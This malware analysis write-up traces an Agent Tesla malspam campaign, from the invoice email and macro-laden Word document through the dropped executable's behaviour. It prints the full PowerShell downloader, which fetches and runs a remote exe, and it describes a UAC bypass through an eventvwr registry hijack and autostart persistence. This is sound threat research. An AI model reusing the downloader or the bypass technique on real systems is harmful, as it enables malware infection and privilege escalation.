I recently got my hands on some malspam entitled “Invoice attched for your reference.”
Below is an image of the email:

Sender address ap@superstudio.me

The image of a PDF document links to hxxp://dropcanvas.com/ozbak/1:

Dropcanvas.com is a site used to transfer files between users. While not inherently
malicious, file sharing sites are often abused in these types of social engineering schemes.
Clicking on the link in the email downloads PI2983793.doc, which contains an embedded
VBA macro acting as a downloader.

For anyone interested, I uploaded the obfuscated macro to Pastebin. If you don’t have the
time to statically analyze the macro, then there are numerous dynamic analysis techniques
you could use to retrieve the malicious script.
The example below shows the VBA debugging tool built into Office being used to retrieve the
PowerShell script containing the malicious URL:

Full script:
powershell.exe -WindowStyle Hidden -noprofile If (test-path $env:APPDATA +
'u7cm.exe') {Remove-Item $env:APPDATA + 'u7cm.exe'}; $KDFB = New-Object
System.Net.WebClient; $KDFB.Headers['User-Agent'] = 'USRUE-VNC';
$KDFB.DownloadFile('hxxps://authenticrecordsonline[.]com/costman/dropcome.exe',
$env:APPDATA + 'u7cm.exe'); (New-Object -com
Shell.Application).ShellExecute($env:APPDATA + 'u7cm.exe'); Stop-Process -Id
$Pid -Force

We can also verify that, as shown in the script above, it uses the User-Agent “USRUE-VNC”
when downloading the malware payload:

powershell.exe created file u7cm.exe in %AppData% and then creates process u7cm.exe
(PID: 5012).

Static analysis shows it was built with .Net Framework

Side note… on my first run I had a popup request to download .NET Framework 3.5:

I then enabled .NET Framework 3.5 through Windows Features, restarted the system, and
resumed dynamic analysis of the sample.
Next, u7cm.exe (PID: 5012) created a hidden copy of itself at %AppData%jafjaf.exe. I unhid
the file and took a screenshot, shown below:

u7cm.exe (PID: 5012) then sets the autostart registry key

Later we see u7cm.exe (PID: 5012) create “u7cm.exe” (PID: 3296) as a new
process, u7cm.exe (PID: 5012) creates a log file
at %LocalAppData%MicrosoftCLR_v2.0_32UsageLogs and writes to it, and then u7cm.exe
(PID: 5012) kills its own process.

u7cm.exe (PID: 3296) sets registry key
HKCUSoftwareClassesmscfileshellopencommand(Default):

Another view showing the value being set:

Next, u7cm.exe (PID: 3296) creates process eventvwr.exe, both PID 5856 and PID 6096.
PID 6096, running with High integrity, creates powershell.exe (PID: 3036), which then creates
process u7cm.exe (PID: 2384) with a High integrity level. An example of this can be seen in
the process tree and currently running processes:

Finally, we see u7cm.exe (PID: 3296) create and write to OFd.exe (PID: 6108) in %Temp%:

Shout-out to Vitali Kremez @VK_Intel for identifying this malware sample as Agent Tesla.
According to other research done on this malware, the logged keystroke information is saved
at %Temp%log.tmp in plain-text, however, I couldn’t find similar files on my system.
Here are some additional references detailing the functionality of Agent Tesla:
